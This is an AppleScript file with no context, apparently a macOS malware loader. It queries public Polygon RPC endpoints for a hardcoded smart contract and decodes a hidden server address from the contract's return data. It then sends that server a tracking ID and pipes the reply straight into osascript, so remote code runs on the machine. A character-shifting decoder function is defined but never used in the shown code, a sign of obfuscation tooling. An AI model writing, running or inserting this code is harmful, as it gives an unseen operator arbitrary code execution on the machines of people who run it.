on b(L)
set T to ""
repeat with c in L
set T to T & (character id ((c as integer) + 8))
end repeat
return T
end b
set d to "97fa238e3900cf3fef386e282234d58e"
on k()
global e, g
try
set e to paragraphs of (do shell script "curl -s https://chainlist.org/rpcs.json | jq -r '.[] | select(.chainId == 137) | .rpc[] | select(type == \"object\") | .url | select(startswith(\"https://\"))'")
set f to "{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"0x3445fB8Df432320251f611e691fe6B0C6664C960\",\"data\":\"0x2686ecea\"},\"latest\"],\"id\":1}"
set g to ""
repeat with j in e
try
set g to do shell script "hex=$(curl -s --max-time 5 '" & (j as string) & "' -X POST -H 'Content-Type: application/json' --data '" & f & "' | jq -r '.result' | sed 's/^0x//'); [ -z \"$hex\" ] && exit 1; /bin/bash -c 'h=$1; l=$(printf \"%d\" \"0x${h:64:64}\"); echo \"${h:128:$((l*2))}\" | xxd -r -p' _ \"$hex\""
if g is not "" then return true
end try
end repeat
end try
return false
end k
if k() then
set i to "curl --connect-timeout 5 --max-time 20 --retry 3 --retry-delay 5 " & "-X POST https://" & quoted form of g & " " & "-d " & quoted form of ("txid=" & d & "&bmodule") & " | osascript"
do shell script i
end if